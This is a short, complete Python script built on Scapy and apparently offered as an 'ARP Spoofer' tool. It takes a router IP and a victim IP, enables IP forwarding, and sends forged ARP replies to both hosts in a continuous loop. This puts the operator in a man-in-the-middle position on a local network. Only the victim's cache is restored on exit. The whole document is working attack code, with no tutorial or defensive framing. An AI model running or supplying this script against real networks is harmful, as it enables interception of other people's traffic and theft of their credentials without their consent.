#!/bin/python3 
from scapy.all import *
import os
import scapy
from scapy import *
import argparse
banner="""
                  ▄▄  ▄▄▄▄▄▄▄▄                                ▄▄        ▄▄
       ██        ██   ▀▀▀▀▀███                        ██       █▄        █▄
      ██        ██        ██▀    ▄████▄    ██▄████  ███████     █▄        █▄
     ██        ██       ▄██▀    ██▄▄▄▄██   ██▀        ██         █▄        █▄
    ▄█▀       ▄█▀      ▄██      ██▀▀▀▀▀▀   ██         ██          █▄        █
   ▄█▀       ▄█▀      ███▄▄▄▄▄  ▀██▄▄▄▄█   ██         ██▄▄▄        █▄        █▄
  ▄█▀       ▄█▀       ▀▀▀▀▀▀▀▀    ▀▀▀▀▀    ▀▀          ▀▀▀▀         █▄        █▄
 """
def parse_arguments():
 global router_ip,vicim_ip
 print(banner)
 parser = argparse.ArgumentParser(description="ARP Spoofer")
 parser.add_argument("-r",'--router', help="IP Address of router")
 parser.add_argument("-v",'--vicim', help="IP Address of vicim")
 args = parser.parse_args()
 router_ip= args.router
 vicim_ip=args.vicim
def main():
 parse_arguments()
 forward_ip('1')
 print("\nIP forward is enabled")
 spoof()
def forward_ip(setting):
 with open("/proc/sys/net/ipv4/ip_forward",'w') as file:
  file.write(setting)
def spoof():
 try:
  while True:
   send(ARP(pdst=vicim_ip, hwdst=check_mac(vicim_ip), psrc=router_ip, op='is-at'),verbose=0)
   send(ARP(pdst=router_ip, hwdst=check_mac(router_ip), psrc=vicim_ip, op='is-at'),verbose=0)
   print("\nSending arp package to {0} as {1} and {1} as {0}".format(vicim_ip,router_ip))
 except KeyboardInterrupt:
  print("\nRestoring settings...")
  send(restore_settings(),count=5,verbose=0);forward_ip('0')
  print("Settings restored")
  exit()
def restore_settings():
 return ARP(pdst=vicim_ip, hwdst=check_mac(vicim_ip), psrc=router_ip, hwsrc=check_mac(router_ip))
def check_mac(v_ip):
 mac,_= srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=v_ip), timeout=3)
 if mac:
  return mac[0][1].src 
main()
